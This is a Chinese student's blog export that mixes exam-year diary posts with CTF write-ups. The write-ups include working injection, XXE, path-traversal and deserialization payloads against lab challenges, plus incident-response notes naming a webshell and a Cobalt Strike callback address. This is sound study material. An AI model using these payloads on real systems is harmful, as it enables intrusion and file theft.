[{"title":"2月27日 杂谈","path":"2025/02/27/baiday/","text":"倒数百日,决战高考 今天是高考倒计时第100天,感慨万千. 思绪回到高一,那时,高考倒计时还有1000天。而高考倒计时300天，200天，仍历历在目，时光匆匆,恍如昨日. 按照往年,这个时间应该早已返回学校,坐在教室里,听老师讲课,在这种百日的时候,也一定会有&quot;百日誓师&quot;这种大型活动。但今年,好像是因为教育局的双减,亦或是其他的原因,总之,开学时间延长到了3月3日,距离开学还有4天,而返校后第二天就是五模考试。 “百日”，大抵也是没了吧。 人生很长，高考也不过意味着人生的正式开始，不用去在乎什么，不用去患得患失，只需要在最后的百日里，一直坚持，一路走到底，无论结果怎样，这一路走来，见过了太多的精彩，在最后的这样一个冲刺的时候，只需要做自己，只需要做到最好，只需要不顾一切的向前冲，剩下的，交给奇迹。哪怕结果不是很好，至少努力过，就像蝴蝶飞不过沧海，又有谁忍心责怪呢。 “我向星辰下令，我停泊瞩望，我让自己登基，做风的君王。” 最后，引用一下《蛊真人》中的段落，“为什么坚持只有仙蛊，因为坚持本就不凡” 一个人的坚持会有多难？在场的所有蛊仙，都能回答这个问题。因为他们当中，有的因为责任而坚持，有的因为仇恨而坚持，有的因为精彩而坚持，有的因为爱情而坚持…… 而方源的回答呢？他仍旧面无表情，毫无所动地向前进。 我曾经呐喊过，渐渐的我不发出声音。我曾经哭泣过，渐渐的我不再流泪。我曾经悲伤过，渐渐的我能承受一切。我曾经喜悦过，渐渐的我看淡世间。而如今！我只剩下面无表情，我的目光如磐石般坚硬，我的心中剩下坚持。 这就是我，一个小人物，方源的坚持！光芒骤放，不可逼视。坚持仙蛊，在这一刻，炼成！！！"},{"title":"1月22日 杂谈","path":"2025/01/22/250122杂谈/","text":"开这个杂谈的目的是,pixiv好看的画太多了,想分享出来一些,但是特意发文章结果里面没有字只是pixiv的画有点不太有趣,所以还是做成杂谈,写写日常心得,顺便放几张画出来 正文 四模于昨日结束,现在也算是进入了假期,还剩130多天,但是假期结束过完年就百日誓师了,时间真如白驹过隙,唉 现在脑子里有很多有趣的想法,未来的话,电子相关,开发,安全,感觉都能走 现在软件的各种想法就不谈了,太多了,随便掏一个出来实现了就能发github里,目前没时间搞,高考完再说吧 还有就是一个极其重量级的工程思路,以后有时间了前置技能都解锁高低开发一个出来玩玩 先写这些吧"},{"title":"致2024","path":"2024/12/31/2024/","text":"2024年度总结 2024年度总结 2024 我的最重要的事 对未来的规划 上半年 下半年 最后，祝各位新年快乐！(每年一次) 2024 我的最重要的事 一月二月，额，好像啥也没干 三月，重磅内容！！！RCEmap闪亮登场！！ 详见：从0到1，RCEmap开发之旅别问文章为什么不更新了,研究高考不是很有时间往下写了,项目和文章估计也就高考完有时间了 然后,顺带写了个第一篇稍微重要一点的文章,也就是rce全解(php版) 从0到1，AKRCE之旅 四月,被带飞了一把,没什么好说的六月ak了一个新生赛没什么好说的是个人就行的难度 然后到九月份之前都是开发RCEmap的函数和GUI,九月初发布的v0.6 其实本来合计一个月啥的差不多就能开发出来,但是越搞越多外加上学没时间和难度加大学习新东西,包括 从0到写一个符合自己想法的GUI 其实还挺难的(其实也没那么难) 然后九月到年底也就啥也没搞学习来着,成绩也不见提高,准备准备四模起飞 对未来的规划 去年写的那些,好像,实现了? 上半年 没说的肯定是高考了,啥事能比高考重要啊还剩150多天,还剩三周就四模,完事就放假,过完年回来就百日誓师,百日再百日,三百到二百还能记得呢,二百天的时候还合计不踢球了大课间就闷屋里学习,纯扯淡 下半年 高考完三个月里面高低得把驾照考了 完事开始疯狂学ctf,上大学全给你ak喽 把RCEmap接着往下开发,到时候都得将近鸽一年了 学新玩意,高中没时间搞的大学就有时间了,像是什么开发游戏啊,搞搞别的项目啊,顺带学习下电子那一块的玩意,手搓东西还是挺想了解一下的,也就是现在没时间 唔,差不多想不到东西了那就这样吧,2024上半年还行,下半年过的稀烂,希望2025会好,希望高考能考上目标,希望即使高考考崩了大学也不崩 最后，祝各位新年快乐！(每年一次)"},{"title":"从0到1,学习环境变量的利用方法","path":"2024/07/28/pwd/","text":"环境变量全解 环境变量全解 起因 正文 知识点 例题1 ctfshow 119 例题2 ctfshow 120 例题3 ctfshow 121 /bin/rev /bin/base64 /bin/cat 写这篇文章的原因是很久之前就卡在了ctfshow web入门第120关,也就是利用环境变量来构造,在我的rce全解那篇文章中虽然有所提到,但当时研究的不够深入,写的也不是很明白,所以这里另写一篇专门的环境变量内容 正文 知识点 12345678910111213141516在 Linux Shell 中，环境变量是一种在操作系统环境中存储信息的机制。这些变量包含了有关系统环境和当前会话的信息，可以影响程序的行为和操作系统的运行。以下是关于 Linux Shell 中环墨变量的详细讲解：1. 环境变量的种类：全局环境变量：对所有用户和进程都可见。局部环境变量：只在当前 Shell 会话中可见。2. 常见环境变量：PATH：包含可执行程序的路径，系统会在这些路径下查找可执行文件。HOME：当前用户的主目录路径。USER 或 USERNAME：当前登录的用户名。SHELL：当前使用的 Shell 解释器。PWD：当前工作目录路径。LANG：指定当前语言环境。EDITOR：默认文本编辑器。IFS: urldecode(&quot;%20%09%0A&quot;)等等... 以上来源于gpt 当构造出$&#123;PATH:~A&#125;时,意味着取PATH变量的最后一位字母,而PATH一般来讲是/bin,所以这里就是n 而PWD一般是/var/www/html,所以我们可以取PWD的最后一位l构造nl来读取文件,即$&#123;PWD:~A&#125; 当:~后面是数字时,例如0,意味着取最后一位,而如果没有~,则是第一位,序列是从0开始算的,字母也一样,A代表第一个,C代表第三个 这里还有一个要补充,即 ${#PWD} 的意思为PWD的长度,例如PWD为/var/www/html,则长度为14 对于上面一大堆常见环境变量,我们有大部分是不能知道的,只有PWD PATH SHLVL这种是近乎可以稳定知道的（SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$SHLVL=1，然后在此shell中再打开一个shell时$SHLVL=2。） 0：${#} 1：${#SHLVL}=${##}=${#?}=1 2：$&#123;SHLVL&#125;=2 （SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$SHLVL=1，然后在此shell中再打开一个shell时$SHLVL=2。） 3：${#IFS}=3。（linux下是3，mac里是4） SHLVL一般是: 2 例题1 ctfshow 119 因为: $PWD = /var/www/html 对于：/bin/cat flag.php 则有：/???/?at ?l??.??? 至此我们可以: 1$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125; = $&#123;PWD:0:1&#125; = / 其中中间可以省略变成 1$&#123;PWD::$&#123;##&#125;&#125; ===&gt; $&#123;PWD:0:1&#125; ===&gt; / 1$&#123;PWD:$&#123;SHLVL&#125;:$&#123;&#123;#&#125;SHLVL&#125;&#125; = $&#123;PWD:2:1&#125; = a 1$&#123;PWD:~$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125; = $&#123;PWD:-2:1&#125; = t 1$&#123;PWD:~A&#125; = 取最后一位 = l 1/bin/cat flag.php ===&gt; $&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125;?$&#123;PWD:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PWD:~$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;$IFS?$&#123;PWD:~A&#125;??.??? 例题2 ctfshow 120 源码: 123456789101112131415161718&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; 对于上一道题的payload精简一下可得 构造/bin/cat ????.??? PWD=/var/www/html 所以PWD的第一位就是/ 1$&#123;PWD::$&#123;##&#125;&#125; ===&gt; $&#123;PWD:0:1&#125; ===&gt; / 所以${PWD::${##}}???${PWD::${##}}??t ????.??? 这里为了更短一些可以将${#SHLVL}换成${##} 1$&#123;PWD:~$&#123;SHLVL&#125;:$&#123;##&#125;&#125; ===&gt; t 所以最终payload: 1$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;??$&#123;PWD:~$&#123;SHLVL&#125;:$&#123;##&#125;&#125; ????.??? 例题3 ctfshow 121 123456789101112131415161718&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123; $code=$_POST[&#x27;code&#x27;]; if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;; &#125;&#125;?&gt; 首先是SHLVL和~被ban了,无法使用,这里可以使用rev,base64,或者一种很神奇的构造t的方法 /bin/rev PWD=/var/www/html 取序号第三位可得r 1$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125; ===&gt; $&#123;PWD:3:1&#125; ===&gt; r 123$&#123;IFS&#125; 变量是用于定义字段分隔符的特殊变量，通常包含空格、制表符和换行符。因此，$&#123;#IFS&#125; 的结果会是 $&#123;IFS&#125; 变量中字符的长度。通常情况下，$&#123;IFS&#125; 的长度是 3，因为它包含了默认的空格、制表符和换行符这三个字符。 这个方法的问题在于读取出来的flag的逆序,需要自己再逆回来,有点麻烦 /bin/base64 构造4,使用$&#123;RANDOM&#125;会随机生成一个数,指望他直接生成一个4概率实在是太低了,不如选择长度为4,即 ${#RANDOWM} 所以payload: 1/bin/base64 flag.php ===&gt; /???/?????4 ????.??? ===&gt; $&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 然后多试几次就能出来一个4位数了 /bin/cat 挺有意思的构造法,t在PWD里面是序号第10位,所以可构造10(不是十,是1和0),即 1$&#123;##&#125;$&#123;#&#125; payload: 1/bin/cat ????.??? ===&gt; $&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;??$&#123;PWD:$&#123;##&#125;$&#123;#&#125;:$&#123;##&#125;&#125; ????.???"},{"title":"LitCTF新生赛 WriteUp","path":"2024/06/01/LitCTF/","text":"LitCTF2024 WriteUp LitCTF2024 WriteUp Web exx 一个…池子？ SAS - Serializing Authentication System 浏览器也能套娃？ 高亮主题(划掉)背景查看器 百万美元的诱惑 Misc 涐贪恋和伱、甾―⑺dé毎兮毎秒 你说得对，但__ 原铁，启动！ 盯帧珍珠 总结 Web ak是61最好的礼物，去年才解出五个200多解的签到题，今年已经能ak了 exx 根据题目名字一眼xxe,随便admin/123456抓包看到&lt;username&gt;admin&lt;/username&gt;确定了,然后本来xxe不会的,直接上网现学 (csdn)XXE知识总结，有这篇就够了！ 然后随便拿个poc 123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;里面name改username,file:///etc改file:///flag,直接就出了 flag:NSSCTF&#123;2ca880f2-6e91-4715-a5a7-f6cecdc2f325&#125; 一个…池子？ 输入4显示4一眼ssti，然后fenjing秒了 https://github.com/Marven11/Fenjing flag:NSSCTF&#123;6f25df6b-2968-481d-bcf7-8b85709b8e66&#125; SAS - Serializing Authentication System ez反序列化 本地序列化new的时候赋个值就可以了 12345678910111213141516171819202122232425&lt;?phpclass User &#123; public $username; public $password; function __construct($username, $password) &#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function isValid() &#123; return $this-&gt;username === &#x27;admin&#x27; &amp;&amp; $this-&gt;password === &#x27;secure_password&#x27;; &#125;&#125;$a=new User(&#x27;admin&#x27;,&#x27;secure_password&#x27;);echo serialize($a);?&gt; 然后base64一下扔进去就行了 flag:flag&#123;deserialization_vulnerability&#125; 浏览器也能套娃？ 感觉是真签到,为什么才161解,没看懂题型,是ssrf? payload:file:///flag flag:NSSCTF&#123;f41d90e7-9261-4cbf-a58e-8d7cfef2468d&#125; 高亮主题(划掉)背景查看器 ?url=a,没反应,代码里应该是有反应的,所以不对,抓包看看POST了theme=theme1.php,访问一下报404,看来是相对路径包含的theme1.php,然后./flag ./flag.php 一个个测,最终是../../../../flag flag:NSSCTF&#123;2d8dae27-f508-4921-b4a9-54b7197d2949&#125; 百万美元的诱惑 这题本来能一血的但是九点在学校只有手机没有电脑命令构造对了没有f12看不到真烦死了 第一层闭着眼睛做?a[]=1&amp;b[]=1&amp;c=2025e,出./dollar.php 第二层用点脑子做,题目来源ctfshow,web57,一模一样的36变12而已,原理是$(())在linuxshell中为0,自己echo一下就知道了,然后一点点运算,构造出12 payload:?x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 然后f12一下看 123&lt;?php$flag=&quot;LitCTF&#123;dollar_d0llar_d0ll@r!!!&#125;&quot;;?&gt; Misc 涐贪恋和伱、甾―⑺dé毎兮毎秒 刚打开不知所云,然后扔进随波逐流直接就出了 flag:LitCTF&#123;e8f7b267-9c45-4c0e-9d1e-13fc5bcb9bd6&#125; 你说得对，但__ 一打开就是个二维码,扫一下是云原神(神金,给爷逗乐了) 扔进随波逐流自动识别带zip 为什么不是传统binwalk stegsolve挨个试是因为随波逐流比较自动化,不用puzzlesolver是因为20没买涨到50更不想买了,反正我是web手 然后binwalk分解一下出来四个四分之一二维码,扔进ps随便扫一下就好了(不复现了太麻烦了,ps文件没保存,四个四分之一二维码也直接删了懒得重搞了) flag:LitCTF&#123;Genshin_St@rt!!&#125; 原铁，启动！ 调转手机可以勉强看出flag&#123;good_,后面带黑框的就不明白了,然后原铁,原神和崩铁,就看了一下这俩游戏的文字,原神的反正也看出来了没管直接搜崩铁的了 flag:flag&#123;good_gamer&#125; 盯帧珍珠 还是随波逐流,提示gif被改了,于是修改为gif,然后就是动图,里面插着几帧flag,目押出 flag:LitCTF&#123;You_are_really_staring_at_frames!&#125; (其实我是放stegsolve里一帧一帧看的) 总结 连做带写wp总共2个小时,misc只做4个是因为后面的懒得做了,要出去玩了一开始九点钟一上线看到16个密码2个re,没web没pwn看傻眼了,然后群里说环境一会上,就等了一会先上的exx,然后第二个上的百万美元,exx瞬间就一血了,我看了一眼手机做不了就没管直接看的美元, 然后瞬间秒第一层,第二层一眼原题,直接去找ctfshow里的答案然后执行了,执行完发现,我手机没有f12看不到html注释,眼睁睁看着一血消失,真服了 2023年刚入门打lit,然后狠狠的知道什么叫废物,现在变老登狠狠拷打新生了(x),但是我都ak了怎么才300多名(还是密码出太多了) 很有趣的新生赛,第一次体会到ak的感觉,考点也挺全的"},{"title":"帕鲁杯 CTF应急响应比赛 WriteUp","path":"2024/04/22/paluctfwp/","text":"第一届帕鲁杯 CTF应急响应比赛 WriteUp 目录 第一届帕鲁杯 CTF应急响应比赛 WriteUp 战绩 关于奖励 感悟 WP Web-签到 WEB-r23 Crypto-两元钱的铜匠 CRypto-江枫渔火对愁眠 Crypto-玛卡巴卡有什么坏心思呢 Crypto-签到 1. 签到 提交:[堡垒机的flag标签的值] 2. 提交攻击者第一次登录时间格式为:[2024/00/00/00:00:00] 3. 提交攻击者源IP格式为:[0.0.0.0] 4. 提交攻者使用的cve编号格式为:[CVE-0000-0000] 5. 提交攻击者留着web服务器上的恶意程序的32位小写md5格式为:[xxxxxx] 6. 分析恶意程序连接地址和密码格式为:[md5(地址)-md5(密码)]全小写 7. 提交存在反序列化漏洞的端口格式为:[md5(端口)] 8. 提交攻击者使用的后门路由地址格式为:[md5(/api/xxx)] 9. 提交dnslog反弹域名格式为:[md5(域名)] 10. 提交第一次扫描器使用时间格式为:[2024/00/00/00:00:00] 11. 提交攻击者反弹shell使用的语言格式为:[md5(c++&amp;java)]均为小写 12. 提交攻击者反弹shell的ip格式为:[xxx.xxx.xxx.xxx] 13. 提交攻击者留下的账号格式为:[xxxxx] 14. 提交攻击者的后门账户密码格式为:[md5(password)] 15. 提交测试数据条数格式为[md5(xxx)] 16. 请提交攻击者留下的信息格式为:[xxxx] 17. 请提交运维服务器上的恶意文件md5小写32格式为:[xxxx] 18. 提交恶意文件的恶意函数格式为:[md5(恶意函数)] 19. 请提交攻击者恶意注册的恶意用户条数格式为:[md5(x)] 20. 请提交对博客系统的第一次扫描时间格式为:[[2024/00/00/00:00:00] 21. 提交攻击者下载的文件格式为[xxxx.xxx] 22. 请提交攻击者第一次下载的时间格式为:[xx/Apr/2024:xx:xx:xx] 23. 请提交攻击者留下的冰蝎马的文件名称格式为:[xxxx] 24. 提交冰蝎的链接密码格式为:[xxx] 25. 提交办公区存在的恶意用户名格式为:[xxx] 26. 提交恶意用户密码到期时间格式为:[xxxx] 27. 请对办公区留存的镜像取证并指出内存疑似恶意进程格式为:[xxxx] 28. 请指出该员工使用的公司OA平台的密码格式为:[xxxx] 29. 攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么格式为:[xxxx] 30. 请提交该计算机中记录的重要联系人的家庭住址格式为:[xxxxx] 31. 请提交近源靶机上的恶意文件哈希格式为:[xxx] 32. 提交恶意程序的外联地址格式为:[xxxxx] 33. 提交攻击者使用内网扫描工具的哈希格式为:[xxxx] 34. 请提交攻击者在站点上留下的后门密码格式为:[xxxx] 35. 请提交攻击者在数据库留下的信息格式为:[xxxx] 36. 提交攻击者在监控服务器上留下的dcnlog地址格式为:[xxx.xx.xx] 37. 提交监控服务器上恶意用户的上一次登录时间格式为:[xx/xx/xx/xx:xx:xx] 38. 提交监控服务器上遗留的反弹shell地址和端口格式为:[xxxx:xx] 39. 提交恶意钓鱼文件的哈希格式为:[xxxx] 40. 提交恶意文件外联IP格式为:[xxx] 41. 提交被恶意文件钓鱼使用者的姓名格式为:[xxx] 42. 提交攻击者留下的信息格式为:[xxxx] 43. 提交恶意用户数量格式为:[md5(xxxx)] 44. 请提交员工集体使用的密码格式为:[xxxx] 45. 提交加密文件的哈希格式为:[xxxx] 46. 提交被攻击者加密的内容明文格式为:[xxxx] 47. 请提交符合基线标准的服务器数量格式为:[md5(xx)] 48. 提交办公区的恶意文件哈希格式为:[xxx] 49. 提交恶意回连端口格式为:[xxx] 50. 提交恶意程序中的falg格式为:[xxx] 51. 提交恶意文件中的search_for_text内容 格式为:[xxxx] 战绩 别的大佬说自己被c大部分都是假的，赛后一统计数据全队贡献分最高，但我被c是真的 假人们，水懂啊，比赛第一天早八点开始，我在学校，晚上一回家看见队伍排行第二，我人都傻了，汪队和孙哥俩人差点把应急响应ak 汪队只输出了一天，第二天就飞福建准备打红明谷了，不然汪队能把web和应急都ak了，我的作用就是在汪队离开之后写写web的WP顺手秒一个web签到，好吧汪队其实只解了一个别的还没来得及呢就下线web题了，估计是被D的太狠了，也是一个比较简单绕过__wakeup()的反序列化 我不做flag的生产者，我只是flag的搬运工（我的意思是我在孙哥有事交不了flag的时候代交一下） 最后也是有惊无险拿下第十（输出都是汪队和孙哥打的） 关于奖励 本身就是公益性质的比赛,也是第一个将应急响应出在ctf里面的比赛,官方准备的不是很充分,周五比赛周四出的题,奖品也都是官方自掏腰包买的,也就zoomeye和玄机给了点赞助(5个月度vip和200个邀请码),而且比赛一开始3小时被人D了400g,确实有点缺德了本来官方是只设置为第一一等奖第二二等奖这种,第四就是优秀贡献奖了,后来在群里好多群u都需要奖状混学分所以最后官方决定前六是特等奖后面20个一等30个二等50个三等,奖励内容没有增加(因为官方真没钱了) 最后我们第十的奖励就是一个玄机邀请码,一个电子证书,证书估计五一前后会发出来 感悟 看群里一大堆人连大一都是稀有物种,高中生好像也就我一个,谁家好人高中就开始应急响应啊,提前为社畜生活积累经验是吧这次的主要问题是应急响应类比赛第一次参加,什么都不懂,但是被带飞了赛后群友说堡垒机里面有录像,记载着出题人出题的过程,甚至还有复制错了的&quot;你竟然敢吼我!&quot;,非常有意思,虽然我不知道哪个是堡垒机(x) 而且我的环境一直有问题不知道为什么,我也就一开始访问成功了,后来也许是我改了root密码还是什么原因就不知道了,反正除了webserver那个服务以外一个jumpserver一个长亭雷池waf我都访问不上我就一直在那翻机器里的日志,但是日志里面内容又乱又没有有价值的东西,最后看群友还翻的靶机的注册表,我根本想不到,而且靶机开机自启动的一个服务器管理程序就是恶意程序,我以为是题目里面的东西听说还有火眼这种取证神器,但是要钱,也不知道具体情况 哎呦你妈的web最少解那个文件上传题看wp好简单啊,就是一个*解析的事,传个shell.php *.jpg就可以了的,结果我不会抓自己本地的包,而且后面不想努力了想摆了所以没做出来 嗯,就是这些,再接再厉吧（嗯，writeup也不是我写的，正如我说的那样，我只是搬运的） WP Web Web-签到 flask写的两个路由，flag是返回paluctf，另外一个是路由接收url，url响应体有paluctf就return flag 请求自己带flag响应体就有paluctf，直接就出来了 WEB-r23 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpshow_source(__FILE__);class a&#123; public $b; public function __get($a)&#123; $this-&gt;b-&gt;love(); &#125;&#125;class b&#123; public $a; public $c; public $d = 1; public function __destruct()&#123; $tmp = $this-&gt;c-&gt;name; &#125; public function __wakeup()&#123; $this-&gt;c = &quot;no!&quot;; $this-&gt;b = $this-&gt;a; &#125;&#125;class xk&#123; public function love()&#123; system($_GET[&#x27;a&#x27;]); &#125;&#125;$payload = new b();$a = new b();$a-&gt;b = &amp;$a-&gt;d;$a-&gt;b = &amp;$a-&gt;c;$a-&gt;a = new a();$a-&gt;a-&gt;b = new xk();echo serialize([$a, $payload]);unserialize($_GET[&#x27;pop&#x27;]);//?pop=a:2:&#123;i:0;O:1:&quot;b&quot;:4:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;s:1:&quot;c&quot;;N;s:1:&quot;d&quot;;i:1;s:1:&quot;b&quot;;R:5;&#125;i:1;O:1:&quot;b&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;N;s:1:&quot;d&quot;;i:1;&#125;&#125;&amp;a=cat%20flag.php 基本的构造绕过，具体POP如下 创建b类的实例$a。 设置$a-&gt;a为新的a类实例。 将$a-&gt;a-&gt;b设为xk类的新实例。 设置$a-&gt;b为对$a-&gt;d的引用，然后改为对$a-&gt;c的引用。 序列化$a对象。 Crypto Crypto-两元钱的铜匠 123456789n = 80916351132285136921336714166859402248518125673421944066690210363157948681543515675261790287954711843082802283188843248579293238274583917836325545166981149125711216316112644776403584036920878846575128588844980283888602402513345309524782526525838503856925567762860026353261868959895401646623045981393058164201N = 175887339574643371942360396913019735118423928391339797751049049816862344090324438786194807609356902331228801731590496587951642499325571035835790931895483345540104575533781585131558026624618308795381874809845454092562340943276838942273890971498308617974682097511232721650227206585474404895053411892392799799403leak = 161177488484579680503127298320874823539858895081858980450427298120182550612626953405092823674668208591844284619026441298155371399651438065337570099147890081125477609238234662000811899869636390550619251741676887565983189442613760093303841954633720778312454175652907352477365434215186845209831284593041581382419a = pow(9999, 66666)b = pow(66666, 9999)P.&lt;x&gt; = PolynomialRing(Zmod(N))f = a*x^2 - leak*x + b*np = f.roots()print(p) 通过Sage Cell 服务器 (sagemath.org) 网站,得到p 然后根据p，q，n，c,rsa解密。 55889464403601630400535396894773636084437838131024127884720705327499836176203640678726013 转换明文得到flag paluctf&#123;6699669966996699669966996699&#125; CRypto-江枫渔火对愁眠 12345678对于每位:li1=(leak1 &gt;&gt; idx)&amp;1li2=(leak2 &gt;&gt; idx)&amp;1pi =(p&gt;&gt;idx)&amp;1qi=(q&gt;&gt;idx)&amp;1只有以下4种情形:[1]pi=1 and qi=1-&gt;li1-1 and li2=1[2]pi=0 and qi-1-&gt;li1=0 and li2-1[3]pi=1 and qi=0-&gt;li1-0 and li2-1[4]pi=0 and qi-0-&gt;li1-0 and li2=0 写出解密脚本 Crypto-玛卡巴卡有什么坏心思呢 和应急响应46 同脚本解密得到答案 Crypto-签到 打开socket代理，写脚本连接服务器，接收加密数据和参数，然后利用RSA解密算法计算并返回解密后的消息。 12345678910111213141516171819202122232425262728293031323334from pwn import remotefrom Crypto.Util.number import long_to_bytes, inversedef connect_and_calculate(host, port): # 连接到服务器 conn = remote(host, port) try: conn.recvuntil(b&#x27;Hi Palu\\n&#x27;) c_line = conn.recvline().decode() p_line = conn.recvline().decode() e_line = conn.recvline().decode() c = int(c_line.split(&#x27;: &#x27;)[1].strip()) p = int(p_line.split(&#x27;: &#x27;)[1].strip()) e = int(e_line.split(&#x27;: &#x27;)[1].strip()) n = p * p phi_n = p * (p - 1) d = inverse(e, phi_n) plaintext = pow(c, d, n) decrypted_message = long_to_bytes(plaintext) return decrypted_message finally: conn.close()host = &#x27;127.0.0.1&#x27;port = 58109while True: try: result = connect_and_calculate(host, port) print(result) except Exception as e: print(f&quot;发生错误：&#123;e&#125;&quot;) 应急响应 1. 签到 提交:[堡垒机的flag标签的值] 使用账号登录jumpserver，更多选项-》标签列表 2. 提交攻击者第一次登录时间格式为:[2024/00/00/00:00:00] 切换工作目录为审计台，排除查登录日志，时间筛选一年以内，分析发现有一个LAN登录 3. 提交攻击者源IP格式为:[0.0.0.0] 分析jumpserver日志和会话，发现除20网段以外的地址，1.4 4. 提交攻者使用的cve编号格式为:[CVE-0000-0000] 分析webserver日志，发现jumpserver被攻击，上网查询相关cve 5. 提交攻击者留着web服务器上的恶意程序的32位小写md5格式为:[xxxxxx] 目录排查发现webserver虚拟机root目录下有一个home elf文件，jumpserver会话命令有提示将ppttteee文件mv到该目录下，并且时间对应 6. 分析恶意程序连接地址和密码格式为:[md5(地址)-md5(密码)]全小写 7. 提交存在反序列化漏洞的端口格式为:[md5(端口)] webserver中审计日志和查看进程信息，fastjson存在java反序列化 8. 提交攻击者使用的后门路由地址格式为:[md5(/api/xxx)] webserver中还有一个7001端口监听了flask服务，分析app.py审计flask的log得到api 9. 提交dnslog反弹域名格式为:[md5(域名)] 分析后门写入的日志 10. 提交第一次扫描器使用时间格式为:[2024/00/00/00:00:00] 分析后门日志的时间戳，从19开始后大规模扫描 11. 提交攻击者反弹shell使用的语言格式为:[md5(c++&amp;java)]均为小写 分析后门日志发现py的反弹shell 12. 提交攻击者反弹shell的ip格式为:[xxx.xxx.xxx.xxx] 继续分析后门日志 13. 提交攻击者留下的账号格式为:[xxxxx] /var/backup文件夹，进去有账号密码备份 14. 提交攻击者的后门账户密码格式为:[md5(password)] 同上，拉去john爆一下 15. 提交测试数据条数格式为[md5(xxx)] 分析后门日志，发现除爆破数据外前面测试了五次ls命令 16. 请提交攻击者留下的信息格式为:[xxxx] nginx的日志目录 17. 请提交运维服务器上的恶意文件md5小写32格式为:[xxxx] jumpserver看日志，排序时间发现helloworld程序，查看相关命令 18. 提交恶意文件的恶意函数格式为:[md5(恶意函数)] 入口函数名 19. 请提交攻击者恶意注册的恶意用户条数格式为:[md5(x)] 查看论坛的数据库地址，查询数据表得到注册的恶意用户 20. 请提交对博客系统的第一次扫描时间格式为:[[2024/00/00/00:00:00] 查看Discuz!论坛的数据访问日志，在error中得到扫描时间 /var/www/html/data/log/202404_errorlog.php 21. 提交攻击者下载的文件格式为[xxxx.xxx] web根目录的备份文件upload.zip 22. 请提交攻击者第一次下载的时间格式为:[xx/Apr/2024:xx:xx:xx] 23. 请提交攻击者留下的冰蝎马的文件名称格式为:[xxxx] /var/www/html/api/nidewen.php 24. 提交冰蝎的链接密码格式为:[xxx] 解密key文件名 25. 提交办公区存在的恶意用户名格式为:[xxx] PC-01 net user 26. 提交恶意用户密码到期时间格式为:[xxxx] 和25题一样看信息 27. 请对办公区留存的镜像取证并指出内存疑似恶意进程格式为:[xxxx] 28. 请指出该员工使用的公司OA平台的密码格式为:[xxxx] 29. 攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么格式为:[xxxx] 30. 请提交该计算机中记录的重要联系人的家庭住址格式为:[xxxxx] strings大法+百度智能化引擎搜索 31. 请提交近源靶机上的恶意文件哈希格式为:[xxx] md5 值 [a7fcd0b15a080167c4c2f05063802a6e] 启动目录下artifact.exe 32. 提交恶意程序的外联地址格式为:[xxxxx] cs木马逆向配合OD动态查看ip，这个里面有一个解密的程序把这里一段字符 揭秘一下就是一个函数，然后 运行到执行之前用F12搜关键字 传微步也能得到！！！ http://101.78.63.44:80/UphQey 